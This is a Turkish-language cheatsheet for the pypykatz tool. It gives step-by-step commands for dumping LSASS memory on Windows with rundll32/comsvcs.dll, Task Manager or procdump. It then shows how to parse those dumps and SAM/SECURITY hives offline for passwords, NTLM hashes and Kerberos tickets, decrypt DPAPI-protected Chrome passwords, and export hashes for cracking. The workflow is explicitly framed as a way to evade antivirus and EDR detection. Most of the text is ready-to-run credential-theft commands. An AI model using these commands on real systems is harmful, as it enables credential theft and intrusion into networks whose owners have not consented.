# pypykatz Bilgi Notu (Cheatsheet)

[pypykatz](https://github.com/skelsec/pypykatz), ünlü [Mimikatz](https://github.com/gentilkiwi/mimikatz) aracının saf Python ile geliştirilmiş çapraz platform sürümüdür. Sızma testi ve olay müdahale (incident response) uzmanlarının Windows hedef makinelerinden alınan LSASS bellek dökümlerini (minidump), SAM/SYSTEM/SECURITY kayıt defteri dosyalarını, DPAPI master anahtarlarını ve Kerberos biletlerini Linux ve macOS sistemler üzerinde, Windows Defender veya EDR alarmlarına takılmadan **çevrim dışı** ayrıştırmasını sağlar.

---

## İçindekiler

- [Genel Bakış & Operasyonel Güvenlik (OpSec)](#genel-bakış--operasyonel-güvenlik-opsec)
- [Kurulum](#kurulum)
- [Çevrim Dışı LSASS Döküm Analizi (`lsa minidump`)](#çevrim-dışı-lsass-döküm-analizi-lsa-minidump)
- [SAM & SYSTEM Kovanlarından Parola Çıkarma (`registry sam`)](#sam--system-kovanlarından-parola-çıkarma-registry-sam)
- [LSA Sırları (Secrets) Çıkarma (`registry security`)](#lsa-sırları-secrets-çıkarma-registry-security)
- [DPAPI Master Anahtarları & Kimlik Çözme](#dpapi-master-anahtarları--kimlik-çözme)
- [JSON Formatında Dışa Aktarma & Otomasyon](#json-formatında-dışa-aktarma--otomasyon)
- [Windows'ta Güvenli LSASS Dökümü Alma Yöntemleri](#windowsta-güvenli-lsass-dökümü-alma-yöntemleri)

---

## Genel Bakış & Operasyonel Güvenlik (OpSec)

Hedef makinede doğrudan `mimikatz.exe` çalıştırmak güncel antivirüs ve kurumsal EDR çözümleri tarafından anında engellenir ve alarm üretir. `pypykatz` döküm alma ile analiz süreçlerini birbirinden ayırır:
1. LSASS bellek dökümü hedefte yerleşik Windows araçlarıyla (Task Manager, `comsvcs.dll` veya `procdump`) sessizce alınır.
2. Elde edilen `.dmp` dosyası saldırganın Linux analiz makinesine çekilir.
3. `pypykatz` ile dosya çevrim dışı analiz edilir; hedef makinede hiçbir şüpheli analiz işlemi yürütülmez.

---

## Kurulum

```bash
# Pipx ile izole kurulum (Önerilen)
pipx install pypykatz

# Python pip ile kurulum
python3 -m pip install --user pypykatz

# Kaynak koddan kurulum
git clone https://github.com/skelsec/pypykatz.git
cd pypykatz
pip install .

# Kurulumu doğrulayın
pypykatz -h
```

---

## Çevrim Dışı LSASS Döküm Analizi (`lsa minidump`)

Hedef sistemden alınan `lsass.dmp` bellek dosyasını ayrıştırarak açık metin parolaları, NTLM özetlerini, Kerberos biletlerini ve AES anahtarlarını çıkarın:

### 1. Temel Minidump Analizi
```bash
pypykatz lsa minidump /path/to/lsass.dmp
```
Çıktı güvenlik sağlayıcılarına (SSP) göre kategorize edilir:
- **msv1_0:** Kullanıcı adları, etki alanları, NTLM ve LM hashleri.
- **wdigest:** Açık metin parolalar (WDigest önbelleği aktifse).
- **kerberos:** Kerberos biletleri (TGT/TGS) ve AES şifreleme anahtarları.
- **ssp:** Güvenlik Destek Sağlayıcısı (SSP) kimlik bilgileri.
- **livessp:** Microsoft hesabı şifreleri.
- **cloudap:** Azure AD Primary Refresh Token (PRT) kayıtları.

### 2. Klasördeki Tüm Dökümleri Topluca Tarama
```bash
pypykatz lsa minidump /loot/dumps/ -r
```

---

## SAM & SYSTEM Kovanlarından Parola Çıkarma (`registry sam`)

Hedef sistemden kopyalanan çevrim dışı SAM ve SYSTEM kayıt defteri kovanlarından yerel kullanıcı parolalarını çekin:

```bash
pypykatz registry sam /loot/SYSTEM /loot/SAM
```
Örnek çıktı:
```text
RID: 500
Username: Administrator
LM: None
NT: 31d6cfe0d16ae931b73c59d7e0c089c0
```

---

## LSA Sırları (Secrets) Çıkarma (`registry security`)

`SECURITY` ve `SYSTEM` kovanlarından servis hesabı şifrelerini, otomatik oturum açma (autologon) parolalarını ve makine hesabı hashlerini elde edin:

```bash
pypykatz registry security /loot/SYSTEM /loot/SECURITY
```
Elde edilen hassas veriler:
- `_SC_DefaultPassword`: Otomatik oturum parolaları.
- `$MACHINE.ACC`: Etki alanı bilgisayar hesabı NTLM hash'i.
- Önbelleğe alınmış etki alanı parolaları (DCC2 / mscache2).

---

## DPAPI Master Anahtarları & Kimlik Çözme

Data Protection API (DPAPI) tarafından şifrelenen Chrome şifrelerini, Wi-Fi profillerini ve RDP kayıtlarını çözün:

### 1. Kayıt Defterinden Master Anahtarı Çıkarma
```bash
pypykatz dpapi masterkey /loot/SYSTEM /loot/masterkey_dosyasi
```

### 2. Chrome'da Kayıtlı Parolaları Çözme
```bash
pypykatz dpapi chrome --masterkey <MASTER_KEY_HEX> /loot/Login_Data
```

---

## JSON Formatında Dışa Aktarma & Otomasyon

Elde edilen kimlik bilgilerini otomatik hatlara veya Hashcat'e iletmek için JSON olarak kaydedin:

```bash
# Minidump sonucunu JSON dosyasına yaz
pypykatz lsa minidump lsass.dmp -k /tmp/loot_creds.json
```

`jq` aracıyla doğrudan NTLM hash listesini ayıklayın:
```bash
jq -r '.logon_sessions[].msv_creds[] | "\(.username):\(.NT)"' /tmp/loot_creds.json | grep -v 'None' | sort -u > ntlm_hashleri.txt
```

---

## Windows'ta Güvenli LSASS Dökümü Alma Yöntemleri

`pypykatz`'a beslemek üzere hedef Windows makinede yerleşik araçlarla bellek dökümü alma teknikleri:

### 1. Yerleşik `comsvcs.dll` ile Döküm Alma (Yönetici PowerShell)
```powershell
# LSASS süreç kimliğini (PID) öğrenin
$pid = (Get-Process lsass).Id

# rundll32 ile tam bellek dökümü alın
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $pid C:\Windows\Temp\lsass.dmp full
```

### 2. Görev Yöneticisi (Task Manager) ile
1. Görev Yöneticisini Yönetici olarak açın.
2. **Ayrıntılar (Details)** sekmesinde `lsass.exe` sürecine sağ tıklayın.
3. **Döküm dosyası oluştur (Create dump file)** seçeneğine basın (dosya `%TEMP%\lsass.DMP` konumuna yazılır).

### 3. Sysinternals `procdump` ile
```cmd
procdump.exe -ma -accepteula lsass.exe C:\Temp\lsass.dmp
```
*Dosyayı Linux makinenize indirdikten sonra `pypykatz lsa minidump lsass.dmp` komutuyla analiz edin.*
